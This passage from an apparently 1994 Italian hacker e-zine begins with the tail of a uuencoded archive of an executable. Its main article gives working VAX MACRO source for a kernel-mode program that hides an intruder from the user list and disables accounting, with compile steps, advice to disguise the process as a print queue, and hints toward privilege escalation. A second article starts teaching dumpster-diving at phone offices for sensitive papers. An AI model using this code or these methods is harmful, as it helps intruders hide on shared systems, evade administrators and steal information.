M$#Y);H-Q<$+3"A=K"YI\%C1/#C!K:/<`=Q*?:W`EL8WX_W!#>KV^(YI3OG!;h
M;?I3?R$+?76WCU7LHWD*-(TK%4<_Q[`OP'[F]22!DK`@RGXT4(&6C]V<2,'&h
M"'#W9U@GMDE$<9T@8^R.@0F@_N54>'KG`(/2U4=;)GF[GW.XWQ7(OY6(C@2;h
MKE`DC/P<$#GT@?!;-3O-@<(@:'LQS7(^>G/?1?&!^1,S*?/!D2:JF;:\O^5^h
M><;:&4??&<WB;Y*Q1R8;YS^E8)/&#4H5,(7NGFX)^8ZFP-[?U=KK:ES<U=!'h
M$931"3K&OIZB2?\.]*LQI37CZSN/2>V./2+)ZYOK>7VU@2\W<7RG,=289$"@h
M0#&C]R(;[K^)`#\'B.N6G3I=GVG>C#J8T9L<550DP7SHH.3#(/\B5-8!*?:Dh
M08/J_O_7Y$Z+3@50M*.KBQ`>?*!QN16.JO2_+WVDL`XQ>@9.'(%RVEXN_ZS#h
MI49%WT'K"$1XY8,_4)X1*:)>;'WE=:6)J_K'FE7K\*E09TKW*%4JE)SO4`U^h
M1/\0P(@6C/!'K5M0[872AP,X`\N)]FK7Q?D;*8!:*!)M))@Q^BR/]<EU$.PVh
M,0-$HN9WWM.13F2B.P.?-5"`7N?:H(,']J?=ZC5T*2<&PBK_$:;WX.$/HV^/h
M/7#Z>MI(+L?3[S1(I<C3EV1P3W1\HJ,-K@]4/E7Z,Z#B.8`4&C*:K"M/XN5Sh
MUCZ0H]R<BZ<[#M9V4Y_3HY"N-Q$UC[XN6*@]X<#LH7/Y5J#GM)7@MDC;UELXh
M7_(AA7.TV-7%UWI/%Q&TU"[0;#"^'SUII,D*[C3(^ER:16+(MF>>N0TWH_3Wh
M\TQ(]SZ4@U$3YKEBHA1]SKL?6<*4NS'Z^.C2%R^S[UB&A>XG7A\PP$HJC87]h
M2:W0(%CJMRIM<I;7PR<06)2A:M^(@_=E$#/@+0K'4;MD=G8`%PV)8"R;8Q7Zh
MOR@@YNMQ3''TZ6(2<P3>@*)/D*YZXP4!A-#JH>'/3Y.,U-Q=1=H@W?3_YC2>h
MK6KP$_@(501_=A#@+6B9^5#LH$L6S6`L\*\!AJ%],K2)M06CIJN8B+V5O;O&h
MN@4I=09CE9%'!S\PV/`%>C?KV0,F:_`=OPNF&\7>5F,)5CW$1XNG;C!"QTCKh
MDAY`].W;11NY?2QQ#U*V4RHQ.>$8PG;=!83O;:X-P/^#68:9C:X=NSX4@-L/h
M$&\]=9&+O0=>AS??Q_/*8E-L.#*5=VF?X.K3J\L!9)*=O?T#?QZ!3:)/[JL=h
MJ9$.Q6M5XK68M3V=-CZR35$+6T.EQ4MT#+N@N[`G`,`$9SKA`*OCF4IW>TX7h
M8$:^47N`/1W1*X(H"48I;*:^!/FZ0_H<6)[OV+\%<_QOEXLH:&VD=WMK<WAKh
M+T_:;)P);^]:C5T+TO)B`GIX0"^/2]0RQ;3_A<B':;V;P&SSZ_OK#T)"U@?@h
M'^E\5U>:VL>KW_H+RKCDJXZST@207;3_S%*A')&:^0]H\.EEA1%<Z24_/0EBh
M+PG4?+::;I4N\R=KKZ[=A"W(=`M`=.T`FD??7`"QDQVXXP/WE3L*8A+JQ017h
M#/@#3*)[=2=S:3+&\G8?='<ZX-%%'UX.C'F9\ULAF)<_7R_PZ3JB)DCTXOW\h
M\G^U&/P$O-5<$`S#N8#2>75Z5=ISL/@K6."-<@QRVID_*6&<X7IU5_O`8UF?h
M(JY4G'T.TL'GL"-K'QZPH%/<%H>D%_H(@#W:>G5D<<ZO+/6^!RQ5T^O8/7G#h
M+G8/R!54GR/CM1?UL'8?+7CC]/0&`^R9K9[M^T`Z,6JO]()$%9#S26MD1]<Ch
M[Y&7!SV:D^>=&\#MZ9OO%:<Q1-%72D^/+#`E(:^NMNCT>/]#>C:T:U(-H;^Dh
M=..<[?UU>LL`(97-!UB2RA,;7<=P\:GH,YV0CN`)FN()2J+KY0^@2O$1I=!$h
M?WE'(7=>.TJ@Q]$$.">=Y5_N#/+BPZH#Q(WX/3,`;&O+ZQ1JGP'MB,PBY/HBh
MY/S^"-F(C6ENQ('1_1LO:E#(IWKB(L(UX2)^^(^UX>T&#JC['(;M[O#_-T'5h
M%Q``+^[X3R-^H`'V*SJP#C1W@QD)B_VU@J#-Y0ME?^5CS'^R`HZ=`GX^)^]`h
M#^=5"+NEZOO;2HFA@B4!W'"V"[P??Y)PJ?#I!&&@XG8%$CRI>K'PA</KBO/Dh
MG[(V1/9$_S<F&H!A+5<^%I%/M4)ZZLQ_FJ[`)/$C)<9N,:=K.4FHH@.]\NY1h
MNB817*,57#<R3?(,PAIY=O?VB[&19<8F<<>A;">609O#\VP!Z^C87NIUZ7$[h
M_/MF%4;2@/V^^8'1Y33$Q+][@,9TAPG:N;6&WO(36.#:9(&1YEORS(4CV$IVh
M6/425%-G&KD0C:WCM*EC1^8L43_@F,7A://HJ5><#/`0F@PBAB;#+9D+4_YIh
MWB&Z$90!&QF497@$3D8N<+*\Q,;\1JL*BB=0O`&ALS+^=4M8-(!@=-.I(*76h
M==N2:MJV94$R32M6;EBY>4&V!#GT+=R\<M.>14L7),JQ*4'&S(DS)TN03=..h
ME?MV[ELSTW4O%RZ$?A;Y#>]6@--PP8`#L*CO'/K5:%*F1;\F=6KTR3E@4P08h
M.'#@@`&V@04WE0^)AH8B9[60<L?8,"%#A@PBX18M_I?84`)CE>T%AN5H7``Rh
M*6#*).$!SR2!,0.^(!A`@,J^"#B#8``+*DDD2K=UV;)-88ROT+Q'N`,+PICFh
M:2`8P\;1$@@6>)#A)BR*QW`?TKK#>=SMQG0)$Z28VQUI6KIMP[H%F91N6#:6h
M6F$^A94NJA-DR;D@>29U"[>.^6;3LBWK@SG2F$XS<LOB3+9L%Y?J<@$6E>,Yh
MRWF?+AK$/LT[2CG_W;X1VZ0^+1GS[Y3#OD$:80ZN''8,V.8-?@Y8TV&LLD?#h
M6H,L4V3?VK7GGNK0ZOZ29(9]+DL%Q:S9^^YH!\'Z+L,R#P1E*W80^Q*</5>Qh
M)I1CC#9%NE53Q8D[`*/-CX/XFE8I=D<S+;8'-TOVNVB^K"A1JM#WE2M3>NT)h
M$V])O"E#&#M,F"G:2;EE%LYRW:(4\\S[#)N9=Y-G@UO+DA&"S=FB=8XT1.O/h
MTXFO?=2GC^2EVF!ZF`T5=%YL]K%KLKC=LG+-LGU[)WJ``[;YC&T).OW/8`^2h
M;%J[::9HL&_R5@`&SG.`BQBU#/%U;K6CAW-TXIM](R=WTQX3=N,I]=?N_`$0h
MFVTL1U:<CJQH&30H"-$RHE4&T7*WO='=G@4)]PW<-C6+MK<G@^\!S'F,M=ECh
MFS@5E8>=.X>5$QM+J/\'4$L!`@H!"@````8`4K>9:;N-E4+('0``_2T```L`h
M`````````````````````$U38W)Y<'0N97AE4$L%!@`````!``$`.0```/$=h
$``````#!h
`h
end

-=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=-

[ N.d.r. Complimenti a Hit per il suo ottimo articolo !!! Speriamo che
  presto la ns magazine possa diventare sempre piu' tecnica e con piu
  collaboratori !!!

  Per comunicazioni con Hitman Italy probabilmente seguira' un suo nuovo
  indirizzo Internet. Per informazioni contattate la ns redazione al
  nostro indirizzi Internet :) ]

-----------------------------------------------------------------
PUBBLICITA' REGRESSO
====================

			   CYBERPUNK   E   VIDEOTEL

				      SU

				   ARKIMEDE

	     Nua : 2551604400
	Videotel : *52181#

	Piu' di 20 aree messaggi, incluse aree sul Cyberpunk !!!!!
	----------------------------------------------------------

  Per contattare la NS Redazione su Arkimede potete scrivere in CPE su
  ARKIMEDE alla casella "Dupree's".

-----------------------------------------------------------------
The Black Page - Numero 0, Settembre 1994 - Articolo 5


                    Per la serie:

                    Vax, Assembler ed esaurimento nervoso :
                    ---------------------------------------

                                              Presentiamo :



                                MINCHIA !!!
                                ===========



	Allora, premesso che NON sono un esperto di Assembler Vax, premesso
che cio' che so e' 1000 volte meno di quello che sa tanta altra brava gente
che sta a chiamare VAX dalla mattina alla sera, premesso tutto quello che 
volete voi, mo' provo a scrivere qualche cazzata riguardo a ... boh, 
leggete e se vi piace, eiaculate :)

	Questo e' un programmillo molto carino, si tratta di un INVI che
pero' risulta essere molto piccino, facile quindi da mandare su un vaxillo
e immediatamente compilabile. Ne esiste uno gia' disponibile, scritto dalla
stessa DIGITAL, col nome "INVI.MAR"  ma questo qui e' carinissimo perche' 
e' molto piu' piccolo dell'altro. Scusate se scrivo in questo modo, non
sono frocio, ve lo assicuro, e' solo che sono le 5 e mezza del mattino e mi
sento un po' rincoglionito. 

        Sono riuscito a fare sto programmino sbattendomi qua' e la' tra
listati MAR, files presi da PHRACK o simili, e cose del genere. Alla fine
ce so' riuscito ! (grazie anche all'aiuto di 1 persona che resta sempre 
nel mio cuore (informatico) e che qui ringrazio pubblicamente :
GRAZIE PIERGIORGIO! senza il quale non avrei avuto lo stimolo per imparare
certe cose stupende e meravigliose che popolano il ns cyberspazio cosi' 
martoriato da intemperie legali .. basta va, sto sparando cazzate :))
         
	Chiamero' questo programmino "MINCHIA.MAR" perche', quando lo
lancerete, esclamerete per l' appunto : "Minchia!!!" :)

----------------------------------INIZIO -----------------------------------
.title "Minchia !!!"
.library /SYS$LIBRARY:LIB.MLB/
.link /SYS$SYSTEM:SYS.STB/

$pcbdef
.entry Minchia,^m<>
$cmkrnl_s routin=Sucamela
ret
.entry Sucamela,^m<>

tstl pcb$l_owner(r4)
bneq VaiACagare
bbcc #pcb$v_inter,pcb$l_sts(r4),VaiACagare
clrb pcb$t_terminal(r4)
decw g^sys$gw_ijobcnt
bisl #pcb$m_noacnt,pcb$l_sts(r4)
VaiACagare:
movl #ss$_normal,r0
ret

.end Minchia
---------------------------------- FINE -----------------------------------

	Mamma mia, speriamo sia giusto se no finisce a figura di merda :)
        ("Figur'immierda" come dicono alcuni miei amici calabresi)
A parte gli scherzi, lo e'. Per mandarlo su un vaxillo fate semplicemente
un miserando

$ CREATE MINCHIA.MAR

	Dopodiche' mandate il programmillo in ASCII, e alla fine della 
trasmissione premete CTRL-Z. Cosi' avrete il sorgente pronto per essere
compilato coi seguenti schifosissimi comandi :

$ MACRO MINCHIA 
$ LINK/NOMAP MINCHIA 

        (il /NOMAP non e' proprio "necessario" se non ricordo male, pero'
         fa scena quindi ce lo metto :) provate un po' voi, CON e SENZA :))

	A questo punto avrete generato il programmino MINCHIA.EXE, se
lo lanciate otterrete qualcosa di carino. 

	Esempio per deficenti :

Supponiamo di avere un utenza "COGLIONAZZO" su un vaxillo. Compiliamo
MINCHIA.EXE e poi facciamo :

---------------- <PRIMA DI AVER LANCIATO "MINCHIA.EXE"> :

 $ SH U/F

      VAX/VMS User Processes at 25-AUG-1994 05:50:59.73
    Total number of users = 6,  number of processes = 9

 Username    Process Name    PID     Terminal
 ANALGAME  ANALGAME      00002760  LTA4574: 
 COITUS    COITUS        00001526  LTA4239: 
 COITUS    _LTA4342:     00001A50  LTA4342: 
 COGLIONAZ COGLIONAZ     00002992  LTA4384:    <<<<<<------- NOI *:]
 POMPINO   POMPINO       0000154F  RTA9:    (INGOIO::SMEGMA)
 SPERM     SPERM         00002826  LTA4602: (DSV069/ORGASMATRON)
 SPERM     SPERM_        00002827  (subprocess of 00002826)
 SYSTEM    BATCH_20      00002922  (batch)
 SYSTEM    SYSTEM        00002734  LTA4559: (DSV913-FISTFUCK_2)

----- ora facciamo

$ Run MINCHIA.EXE
$

----- e adesso :)

 $ SH U/F

      VAX/VMS User Processes at 25-AUG-1994 05:50:59.73
    Total number of users = 5,  number of processes = 9

 Username    Process Name    PID     Terminal
 ANALGAME  ANALGAME      00002760  LTA4574: 
 COITUS    COITUS        00001526  LTA4239: 
 COITUS    _LTA4342:     00001A50  LTA4342: 
 POMPINO   POMPINO       0000154F  RTA9:    (INGOIO::SMEGMA)
 SPERM     SPERM         00002826  LTA4602: (DSV069-9.P/P4-ORGASM.)
 SPERM     SPERM_        00002827  (subprocess of 00002826)
 SYSTEM    BATCH_20      00002922  (batch)
 SYSTEM    SYSTEM        00002734  LTA4559: (DSV913-FISTFUCK_2)

	Minchia ! (ecco perche' l'ho chiamato cosi' :)))) siamo spariti
dall'elenco utenti !!! Adesso con questo esempio da coglioni avete capito
come fare :) (almeno si spera) 

	Certo, nell'elenco dei processi rimarra' il vostro processo base.
Conviene allora rinominarlo con un nome che non dia nell'occhio tipo una
coda di stampa :

$ SET PROC /NAME=SYMBIONT_0002

	a seconda di quali code di stampa gia' esistono.

	Se volete scoprire un utente che e' "MINCHIAto", provate a 
esaminare i processi di sistema, a verificare le devices LTA con 
SH DEV LTA per esempio (o altri devices) eccetera ... 

NOTA : E' possibile inserire del codice per poter modificare questo semplice
programmino e fargli fare cose piu' carine, come ad esempio ottenere privilegi
superiori. Per fare cio' si deve scrivere in una tabella di simboli
particolare (ovviamente in Assembler) che e' questa qua : 

Nome simbolico  Locazione          Uso                          Riferimento a
------------------------------------------------------------------------------
CTL$GQ_PROCPRIV!P1 Pointer page   !permanently enabled privs    !SET UIC
PHD$Q_AUTHPRIV !process header    !procs allowable privs        !$setprv
KFI$Q_PROCPRIV !priv install image!image installed with privs   !image actvatr
IHD$Q_PRIVREQS !image header      !unused - set for all privs!  !image actvatr
PHD$Q_IMAGPRIV !process header    !mask for enhanced priv images!$setprv
UAF$Q_PRIV     !sysuaf.dat        !UAF allowable privs          !LOGINOUT
PHD$Q_PRIVMSK  !process header    !working privilege mask       !system srvc's
PCB$Q_PRIV     !PCB               !same as phd$q_privmsk        !device driver
------------------------------------------------------------------------------

	Leggo proprio ora alcune fotocopie del "VAX/VMS internals and
data structures" manual :

------

If a process wishes a privilege that is not in its authorized list, one of two
conditions must hold or the requested privilege is not granted.

1)The process must have SETPRV privilege.  A process with this privilege can
  acquire any other privilege with either the set privilege system service or
  DCL command SET PROCESS/PRIVILEGES.

2)The system service was called from executive or kernal mode. This mechanism
  is an escape that allows either VMS or user-written system services to
  acquire whatever privileges they need without regard for whether the calling
  process has SETPRV privilege.  Such procedures must disable privileges
  granted in this fashion as part of their return path.

------

	E' altresi' necessario linkare la tabella dei simboli di sistema al
nostro file oggetto. Di solito e' SYS$SYSTEM:SYS.STB.

	COL CAZZO CHE VI DICO COME SI FA ! :) Se siete bravi e avete a 
disposizione un vax vostro su cui sperimentare, fate delle prove coll'
assembler dei Vax... 

	Vabbe', visto che insistete, ecco qui qualche stronzata di HELP 
sull'assembler vax. Non ho fatto altro che prendere alcuni HELP online.

----------------------------------------------------------------------
MACRO

  Parameters

     file-spec[,...]

     Specifies one or more VAX MACRO assembly language source files to  be
     assembled.   If you do not specify a file type for an input file, the
     assembler uses the default file type of MAR.

     You can specify more than one input file.  If you separate  the  file
     specifications  with  commas,  each file is assembled separately.  If
     you separate the file specifications with plus signs, the  files  are
     concatenated  and  assembled as a single input file, producing single
     object and listing files.  If a file already  exists  with  the  same
     name  as  the  object  or listing file produced by the command, a new
     file with a version number one higher than  the  previously  existing
     file will be created.

     No wildcard characters are allowed in the file specifications.

MACRO

  Qualifiers

    /ANALYSIS_DATA

     /ANALYSIS_DATA[=file-spec]
     /NOANALYSIS_DATA (default)

     Creates a file containing source code analysis information.   If  the
     file-spec is omitted, the default file name is the same as the source
     program; the default file type is ANA.

     The analysis file is reserved for use with Digital layered  products,
     such as, but not limited to, the VAX Source Code Analyzer.
    /CROSS_REFERENCE

     /CROSS_REFERENCE[=(function[,...])]
     /NOCROSS_REFERENCE (default)

     Controls whether a cross-reference listing is included in the listing
     file.   A  cross-reference  listing  is  a  list of the places in the
     source file where the item specified is defined or referred to.   The
     /CROSS_REFERENCE  qualifier  includes  a cross-reference listing, and
     therefore requires that you specify the /LIST qualifier to produce  a
     listing   file.    The   /NOCROSS_REFERENCE  qualifier  excludes  the
     cross-reference listing.

     You can specify one or more of the functions listed  below.   If  you
     specify  /CROSS_REFERENCE  without any functions, it is equivalent to
     /CROSS_REFERENCE=(MACROS,SYMBOLS).

       ALL               Cross-references  directives,  macros,   operation
                           codes, registers, and symbols

       DIRECTIVES        Cross-references directives

       MACROS            Cross-references macros

       OPCODES           Cross-references operation codes

       REGISTERS         Cross-references registers

       SYMBOLS           Cross-references symbols

     If you specify more than one function, separate them  by  commas  and
     enclose the list in parentheses.

    /DEBUG

     /DEBUG[=option]
     /NODEBUG (default)

     Controls whether local symbols are included in the symbol table,  and
     whether traceback information is included in the object module.

     You can use these qualifiers in place of  the  /ENABLE  and  /DISABLE
     qualifiers,  when  the  DEBUG  and TRACEBACK functions are used.  The
     /DEBUG or /NODEBUG qualifiers will override debugging characteristics
     set with the .ENABLE or .DISABLE assembler directives.

     You can specify one or more of the functions listed  below.   If  you
     specify /DEBUG without any functions, it is equivalent to /DEBUG=ALL.

       ALL               All local  symbols  are  included  in  the  symbol
                           table, and all traceback information is provided
                           in  the  object   module   for   the   debugger.
                           Specifying   this  qualifier  is  equivalent  to
                           specifying             the             qualifier
                           /ENABLE=(DEBUG,TRACEBACK).

       NONE              No local symbols and no traceback information  are
                           made  available  to  the  debugger in the object
                           module.  Specifying this qualifier is equivalent
                           to        specifying        the        qualifier
                           /DISABLE=(DEBUG,TRACEBACK).

       SYMBOLS           All  local  symbols  are  made  available  to  the
                           debugger  in  the  object  module.  No traceback
                           information is made available to  the  debugger.
                           Specifying   this  qualifier  is  equivalent  to
                           specifying  the  qualifiers  /ENABLE=DEBUG   and
                           /DISABLE=TRACEBACK.

       TRACEBACK         Traceback information is  made  available  to  the
                           debugger in the object module.  No local symbols
                           are made available to the debugger.   Specifying
                           this  qualifier  is equivalent to specifying the
                           qualifiers /ENABLE=TRACEBACK and /DISABLE=DEBUG.
    /DIAGNOSTICS

     /DIAGNOSTICS[=file-spec]
     /NODIAGNOSTICS (default)

     Creates  a  file  containing   compiler   messages   and   diagnostic
     information.   If  the file-spec is omitted, the default file name is
     the same as the source program; the default file type is DIA.

     The diagnostics  file  is  reserved  for  use  with  Digital  layered
     products,  such  as,  but  not limited to, the VAX Language Sensitive
     Editor.

    /DISABLE

     /DISABLE=(function[,...])
     /NODISABLE

     Provides  initial  settings  for  the  functions  controlled  by  the
     assembler  directive  .DISABLE.   See  /ENABLE  for  a  list of these
     functions.

     The default is /DISABLE=(ABSOLUTE,DEBUG,TRUNCATION).

     If you specify more than one function, separate them  by  commas  and
     enclose the list in parentheses.

     The /NODISABLE qualifier has the same effect as  not  specifying  the
     /DISABLE qualifier, or negates the effects of any /DISABLE qualifiers
     specified earlier on the command line.

    /ENABLE

     /ENABLE=(function[,...])
     /NOENABLE

     Provides  initial  settings  for  the  functions  controlled  by  the
     assembler  directive  .ENABLE.   You must specify at least one of the
     functions listed below.  You can enable or disable:

       ABSOLUTE          Assembly  of  relative   addresses   as   absolute
                           addresses

       DEBUG             Inclusion of local symbol table information in the
                           object file for use with the debugger

       TRUNCATION        Truncation   of   floating-point    numbers    (if
                           truncation is disabled, numbers are rounded)

       GLOBAL            Assumption that undefined symbols in the  assembly
                           are external symbols

       SUPPRESSION       Suppression of the listing of unreferenced symbols
                           in the symbol table

       TRACEBACK         Provision of information to the debugger traceback
                           mechanism

     The default is /ENABLE=(GLOBAL,TRACEBACK,SUPPRESSION).

     If you specify more than one function, separate them  by  commas  and
     enclose the list in parentheses.

     The /NOENABLE qualifier has the same effect  as  not  specifying  the
     /ENABLE  qualifier,  or negates the effects of any /ENABLE qualifiers
     specified earlier on the command line.

    /LIBRARY

     /LIBRARY
     /NOLIBRARY

     Positional qualifier.

     The /LIBRARY qualifier cannot be used with the /UPDATE qualifier.

     The /LIBRARY qualifier requires that the associated input file  be  a
     macro library.  If you do not specify a file type, the assembler uses
     the default file type of MLB.  The maximum number of  libraries  that
     can  be  searched in any given assembly is 16, one of which is always
     STARLET.MLB.  If you specify  more  than  one  macro  library  in  an
     assembly,  the  libraries  are  searched  in  reverse  order of their
     specification.

     When a macro call is  issued  in  a  source  program,  any  libraries
     specified  with  the  .LIBRARY  directive  are searched first, in the
     reverse order in which they were declared; if the macro definition is
     not  found  in  any  of  the  libraries  specified  with the .LIBRARY
     directive, any libraries specified in the DCL MACRO command line  are
     then  searched  (again,  in  the  reverse  order  in  which they were
     specified); finally, if the macro definition  is  not  found  in  the
     libraries specified in the command line, STARLET.MLB is searched.

     The /NOLIBRARY qualifier has the same effect as  not  specifying  the
     /LIBRARY qualifier, or negates the effects of any /LIBRARY qualifiers
     specified earlier on the command line.

    /LIST

     /LIST[=file-spec]
     /NOLIST

     Controls  whether  an  output  listing  is  created,  and  optionally
     provides an output file specification for the listing file.

     If you issue the  MACRO  command  interactively,  the  assembler,  by
     default,  does  not  create a listing file.  When /NOLIST is present,
     either explicitly or by default, errors are reported on  the  current
     output device.

     If you execute the MACRO  command  in  a  batch  job,  /LIST  is  the
     default.   When  you  specify  /LIST,  you  can  control the defaults
     applied to the output file specification  by  the  placement  of  the
     qualifier  in  the command.  See the VMS DCL Concepts Manual for more
     information on entering output file qualifiers.

     The default file type provided for listing files is LIS.

     No wildcard characters are allowed in the file specification.

    /OBJECT

     /OBJECT[=file-spec]
     /NOOBJECT

     Controls whether an object module is created by  the  assembler.   It
     also defines the file specification for the file.

     By default, the assembler creates an object module with the same file
     name as the first input file.  The default file type for object files
     is OBJ.  When you specify  /OBJECT,  you  can  control  the  defaults
     applied  to  the  output  file  specification by the placement of the
     qualifier in the command.  See the VMS DCL Concepts Manual  for  more
     information on entering output file qualifiers.

     No wildcard characters are allowed in the file specification.

    /SHOW

     /SHOW[=(function[,...])
     /NOSHOW[=(function[,...])]

     Provides  initial  settings  for  the  functions  controlled  by  the
     assembler  directives .SHOW and .NOSHOW.  You can specify one or more
     of the functions listed below.  If  you  specify  /SHOW  without  any
     functions,  the  listing  level count is incremented.  If you specify
     /NOSHOW  without  any  functions,  the   listing   level   count   is
     decremented.

     Since the /SHOW qualifier affects the listing, you must use the /LIST
     qualifier to produce a listing in order to use the /SHOW qualifier.

       CONDITIONALS      Lists unsatisfied conditional code associated with
                           .IF and .ENDC directives

       CALLS             Lists macro calls and repeat range expansions

       DEFINITIONS       Lists macro definitions

       EXPANSIONS        Lists macro expansions

       BINARY            Lists binary code generated by  the  expansion  of
                           macro calls

     If you omit  the  /SHOW  qualifier,  the  default  is  equivalent  to
     /SHOW=(CONDITIONALS,CALLS,DEFINITIONS).

     If you specify more than one function, separate them  by  commas  and
     enclose the list in parentheses.

     For additional details on these functions,  see  the  VAX  MACRO  and
     Instruction Set Reference Volume.

    /UPDATE

     /UPDATE[=(update-file-spec[,...])]
     /NOUPDATE

     Positional Qualifier.

     The /UPDATE qualifier cannot be used with the /LIBRARY qualifier.

     The /UPDATE qualifier requires usage with an  associated  input  file
     that  is  to  be updated with the specified update file or files.  No
     wildcard characters are allowed in the update file specifications.

     The update process uses the batch editor, SLP, to  update  the  input
     file with the update file or files.

     By default, the assembler uses update files with the same name as the
     input source file and a file type of UPD.

     When multiple update files are specified with the /UPDATE  qualifier,
     the  assembler  merges  the  contents  into  a single list of updates
     before applying the updates to the source file.   You  must  separate
     multiple   update   files   with  commas  and  enclose  the  list  in
     parentheses.

     The input source file and update files are not changed by the  update
     operation.   The effects of the update appear in the compiled output.
     The listing also provides an  audit  trail  of  the  changes  if  you
     specify /LIST with /UPDATE.

     If an update file is not found, the assembler prints an informational
     message but continues the assembly.

     The /NOUPDATE qualifier has the same effect  as  not  specifying  the
     /UPDATE  qualifier,  or negates the effects of any /UPDATE qualifiers
     specified earlier on the command line.

MACRO

  Examples

       1.   $ MACRO  ANALSEX

       The MACRO assembler assembles the  file  ORION.MAR  and  creates  an
       object file named ANALSEX.OBJ.  If this command is executed in a batch
       job, the assembler also creates a listing file named ORION.LIS.

       2.   $ MACRO/LIST  SUCCHIA, LYRA/OBJECT=LYRAN

       This MACRO command requests  two  separate  assemblies.   The  MACRO
       command  assembles  SUCCHIA.MAR to produce SUCCHIA.LIS and SUCCHIA.OBJ.
       Then it assembles LYRA.MAR and creates a listing file named LYRA.LIS
       and an object module named LYRAN.OBJ.

       3.   $ MACRO  ALPHA/LIST+MYLIB/LIBRARY-
            $_ + [TEST]OLDLIB/LIBRARY + []BETA
            $ PRINT ALPHA

       The MACRO command concatenates the files ALPHA.MAR and  BETA.MAR  to
       produce  an  object  file  named  ALPHA.OBJ and a listing file named
       ALPHA.LIS.   MYLIB.MLB  (in  the  current  default  directory)   and
       OLDLIB.MLB  (in  the directory [TEST]) are specified as libraries to
       be searched for macro definitions.  When macro calls  are  found  in
       BETA.MAR,  OLDLIB,  MYLIB,  and  the  system library STARLET.MLB are
       searched, in that order, for the definitions.

       The PRINT command prints the listing file ALPHA.LIS.

       4.   $ MACRO  DELTA+TESTLIB/LIBRARY, ALPHA+MYLIB/LIBRARY

       This MACRO command requests two  separate  assemblies.   TESTLIB.MLB
       and   the   system   library  STARLET.MLB  are  searched  for  macro
       definitions when macro calls are found in DELTA.MAR,  and  MYLIB.MLB
       and   the   system   library  STARLET.MLB  are  searched  for  macro
       definitions when macro calls are found in ALPHA.MAR.

MACRO

  Directives

     The general assembler directives provide facilities for performing 11
     types  of  functions;  listing  control,  message  display, assembler
     option, data storage, location control,  program  sectioning,  symbol
     control,   routine   entry   point,  conditional  and  subconditional
     assembly, cross-reference, instruction generation, and linker option.

     The alternate form, if any, is given in parentheses.

    Additional information available:

 .ADDRESS   .ALIGN     .ASCIx     .BLKx      .BYTE      .CROSS     .DEBUG    
 .DEFAULT   .D_FLOATING_(.DOUBLE)
 .DISABLE_(.DSABL)     .ENABLE_(.ENABL)      .END       .ENDC      .ENDM     
 .ENDR      .ENTRY     .ERROR     .EVEN
 .EXTERNAL_(.EXTRN)    .F_FLOATING_(.FLOAT)  .G_FLOATING           
 .GLOBAL_(.GLOBL)      .H_FLOATING           .IDENT     .IF
 .IF_FALSE_(.IFF)      .IF_TRUE_(.IFT)       .IF_TRUE_FALSE_(.IFTF)          
 .IIF       .IRP       .IRPC      .LIBRARY
 .LINK      .LONG      .MACRO     .MASK      .MCALL     .MDELETE   .MEXIT    
 .NARG      .NCHR      .NOCROSS   .NTYPE
 .OCTA      .ODD       .OPDEF     .PACKED    .PAGE      .PRINT     .PSECT    
 .QUAD      .REFn      .REPEAT_(.REPT)
 .RESTORE_PSECT_(.RESTORE)        .SAVE_PSECT_(.SAVE)   .SHOW_.NOSHOW        
 .SIGNED_BYTE          .SIGNED_WORD
 .SUBTITLE_(.SBTTL)    .TITLE     .TRANSFER  .WARN      .WEAK      .WORD

MACRO

  Instructions

    Additional information available:

    ACBx       ADAWI      ADDxx      ADDPx      ADWC       AOBLxx     ASHx      
    ASHP       Bxxxx      BBx        BBxx
    BBxxI      BICxx      BICPSW     BISxx      BISPSW     BITx       BLBx      
    BPT        BRx        BSBx       BUGx
    CALLG      CALLS      CASEx      CHMx       CLRx       CMPx       CMPCx     
    CMPPx      CMPxV      CRC        CVTxx
    CVTLP      CVTPL      CVTPS      CVTPT      CVTSP      CVTTP      DECx      
    DIVxx      DIVP       EDIV       EDITPC
    EMODx      EMUL       EXTxV      FFx        HALT       INCx       INDEX     
    INSQHI     INSQTI     INSQUE     INSV       JMP
    JSB        LDPCTX     LOCC       MATCHC     MCOMx      MFPR       MNEGx     
    MOVx       MOVAx      MOVCx      MOVP
    MOVPSL     MOVTC      MOVTUC     MOVZxx     MTPR       MULxx      MULP      
    NOP        POLYx      POPR       PROBEx
    PUSHAx     PUSHL      PUSHR      REI        REMQHI     REMQTI     REMQUE    
    RET        ROTL       RSB        SBWC
    SCANC      SKPC       SOBGxx     SPANC      SUBxx      SUBPx      SVPCTX    
    TSTx       XFC        XORxx

MACRO

  Operand_Formats

     Operands for  instructions  identify  the  memory  locations  or  the
     registers  that  are  used  by the machine operation.  These operands
     specify the addressing mode for the instruction.


    Additional information available:

  Absolute   Autodecrement         Autoincrement      Autoincrement_deferred
  Branch     Displacement
  Displacement_deferred General    Immediate_or_Literal  Indexed    Register  
  Register_deferred     Relative
  Relative_deferred

MACRO

  Vector_Instructions

    Additional information available:

 Assembler_Notation    VLD        VGATH      VST        VSCAT      VADDL     
 VCMPL      VMULL      VSUBL
 VBIC,_VBIS,_and_VXOR  VSL        VADD       VCMP       VVCVT      VDIV      
 VMUL       VSUB       VMERGE     IOTA       MFVP
 MTVP       VSYNC

---------------------------------------------------------------------

        Dando un'okkiara all'HELP di MACRO troverete tutto l'HELP 
possibile su MACRO. (Logico no ? e allora che cazzo scrivo ... mah)

	Nel prossimo numero di TBP probabilmente parleremo un po' di 
assembler vax, ma MOLTO in linea generale in quanto non sono per niente un
esperto di questo argomento. Spero pero' di poter coinvolgere qualcuno che
veramente se ne intende, invece di star qui da solo, come adesso, alle 6
del mattino come un coglione a non capire un cazzo di niente, con una tazza
di caffe' bollente e i nervi a fior di pelle :)

	Scusatemi se troverete questo articolo un po' merdoso. Ma per me
va benissimo cosi'. In fondo, chi se ne fotte ! :)

                                       Dupree's Paradise


-----------------------------------------------------------------
The Black Page - Numero 0, Settembre 1994 - Articolo 6


		    DOVE/COME/QUANDO/PERCHE' FARE TRASHING
				 Scritto da: 
				  ----------
				    Ice MC
				  ----------
			 Con commenti della redazione
			     by Dupree's Paradise


Prefazione:
-----------
Questo testo contiene le basi del trashing. Io non credo di esser molto prati-
co visto ke l'ho fatto solo un paio di volte, comunque qui ci sono le basi!

Trashing: Cos'e'?
-----------------
Il Trashing (scarto) e' l'azione della ricerca attraverso i rifiuti presi  dai 
bidoni  della  SIP o di qualunque altro Ufficio Telefonico. Lo  scarto  spesso 
contiene cose molto importanti che possono essere da blokki notes dell'ufficio 
